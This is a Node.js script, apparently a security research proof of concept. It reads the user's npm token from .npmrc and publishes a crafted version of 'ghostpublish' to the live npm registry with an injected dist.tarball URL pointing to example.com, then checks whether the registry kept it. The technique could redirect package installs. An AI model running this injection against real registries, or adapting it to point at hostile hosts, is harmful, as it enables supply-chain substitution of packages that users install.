#!/usr/bin/env node
// dist.tarball URL injection test against the public npm registry.
//
// Hypothesis: registry stores the publisher-supplied `dist.tarball` URL as-is,
// rather than overriding it to the canonical registry.npmjs.org path.
//
// Method: PUT a hand-crafted publish body for ghostpublish@1.0.0-distinjection-<ts>
// where dist.tarball = https://example.com/this-is-a-test.tgz, with a real attached
// tarball. Then read the manifest and the canonical CDN path and compare.

import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { execSync } from 'node:child_process'

const REGISTRY = 'https://registry.npmjs.org'
const PKG = 'ghostpublish'
const TS = Math.floor(Date.now() / 1000)
const VERSION = `1.0.0-distinjection-${TS}`
const FAKE_TARBALL = 'https://example.com/this-is-a-test.tgz'

// ---- 1. Read auth token (prefer project-local .npmrc, fall back to home) ----
function readToken() {
  for (const p of [path.resolve('.npmrc'), path.join(os.homedir(), '.npmrc')]) {
    try {
      const text = fs.readFileSync(p, 'utf8')
      const m = text.match(/_authToken=([A-Za-z0-9_-]+)/)
      if (m) return m[1].trim()
    } catch {}
  }
  throw new Error('No npm auth token found in ./.npmrc or ~/.npmrc')
}

const token = readToken()

// ---- 2. Build a minimal tarball ----
const stagingDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ghostpub-distinj-'))
const pkgDir = path.join(stagingDir, 'package')
fs.mkdirSync(pkgDir)
fs.writeFileSync(
  path.join(pkgDir, 'package.json'),
  JSON.stringify({
    name: PKG,
    version: VERSION,
    description: 'dist.tarball URL injection test — research artifact',
    main: 'index.js',
    license: 'MIT',
  }, null, 2),
)
fs.writeFileSync(
  path.join(pkgDir, 'index.js'),
  `// dist.tarball URL injection test\nmodule.exports = { test: 'distinjection', ts: ${TS} };\n`,
)
fs.writeFileSync(
  path.join(pkgDir, 'README.md'),
  `# ${PKG}@${VERSION}\n\nResearch artifact: testing whether the npm registry trusts publisher-supplied \`dist.tarball\` URLs.\n`,
)

const tarballPath = path.join(stagingDir, `${PKG}-${VERSION}.tgz`)
execSync(`tar --no-xattrs --format=ustar -czf "${tarballPath}" -C "${stagingDir}" package`, { stdio: 'inherit' })

const tarballBuf = fs.readFileSync(tarballPath)
const sha1 = crypto.createHash('sha1').update(tarballBuf).digest('hex')
const sha512 = crypto.createHash('sha512').update(tarballBuf).digest('base64')
const integrity = `sha512-${sha512}`

console.log(`\n[build] tarball: ${tarballPath} (${tarballBuf.length} bytes)`)
console.log(`[build] sha1:      ${sha1}`)
console.log(`[build] integrity: ${integrity.slice(0, 50)}...`)

// ---- 3. Construct the publish body with the INJECTED dist.tarball ----
const tgzName = `${PKG}-${VERSION}.tgz`
const versionManifest = {
  name: PKG,
  version: VERSION,
  description: 'dist.tarball URL injection test — research artifact',
  main: 'index.js',
  license: 'MIT',
  _id: `${PKG}@${VERSION}`,
  dist: {
    tarball: FAKE_TARBALL,                                          // <-- the injection
    shasum: sha1,
    integrity,
  },
}

const body = {
  _id: PKG,
  name: PKG,
  description: 'dist.tarball URL injection test',
  'dist-tags': { 'distinjection': VERSION },                         // not touching latest
  versions: { [VERSION]: versionManifest },
  _attachments: {
    [tgzName]: {
      content_type: 'application/octet-stream',
      data: tarballBuf.toString('base64'),
      length: tarballBuf.length,
    },
  },
}

console.log(`\n[publish] PUT ${REGISTRY}/${PKG}`)
console.log(`[publish] version: ${VERSION}`)
console.log(`[publish] injected dist.tarball: ${FAKE_TARBALL}`)

// ---- 4. PUT it ----
const startedAt = Date.now()
const putRes = await fetch(`${REGISTRY}/${PKG}`, {
  method: 'PUT',
  headers: {
    'authorization': `Bearer ${token}`,
    'content-type': 'application/json',
    'accept': '*/*',
  },
  body: JSON.stringify(body),
})

const putText = await putRes.text()
const putElapsedMs = Date.now() - startedAt
console.log(`\n[publish] HTTP ${putRes.status} ${putRes.statusText} (${putElapsedMs} ms)`)
console.log('[publish] response body:')
console.log(putText.length > 1500 ? putText.slice(0, 1500) + '\n  ...(truncated)' : putText)

// ---- 5. Read back the manifest ----
console.log(`\n[verify] GET ${REGISTRY}/${PKG}/${VERSION}`)
await sleep(2000)
const verRes = await fetch(`${REGISTRY}/${PKG}/${VERSION}`, { headers: { 'accept': 'application/json' } })
console.log(`[verify] HTTP ${verRes.status} ${verRes.statusText}`)
if (verRes.ok) {
  const verJson = await verRes.json()
  console.log('[verify] dist:')
  console.log(JSON.stringify(verJson.dist, null, 2))
  if (verJson.dist?.tarball === FAKE_TARBALL) {
    console.log('\n*** RESULT: REGISTRY ACCEPTED THE INJECTED URL ***')
  } else {
    console.log(`\n*** RESULT: registry overrode the URL — manifest dist.tarball is now: ${verJson.dist?.tarball}`)
  }
} else {
  const verText = await verRes.text()
  console.log('[verify] body:', verText.slice(0, 500))
}

// ---- 6. Probe the canonical CDN path ----
const canonicalUrl = `${REGISTRY}/${PKG}/-/${PKG}-${VERSION}.tgz`
console.log(`\n[cdn] HEAD ${canonicalUrl}`)
const cdnRes = await fetch(canonicalUrl, { method: 'HEAD' })
console.log(`[cdn] HTTP ${cdnRes.status} ${cdnRes.statusText}`)
console.log(`[cdn] content-length: ${cdnRes.headers.get('content-length')}`)
console.log(`[cdn] content-type:   ${cdnRes.headers.get('content-type')}`)

// ---- 7. Probe the injected URL (will likely 404) ----
console.log(`\n[injected] HEAD ${FAKE_TARBALL}`)
try {
  const injRes = await fetch(FAKE_TARBALL, { method: 'HEAD' })
  console.log(`[injected] HTTP ${injRes.status} ${injRes.statusText}`)
} catch (err) {
  console.log(`[injected] error: ${err.message}`)
}

console.log('\n[done]')

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }
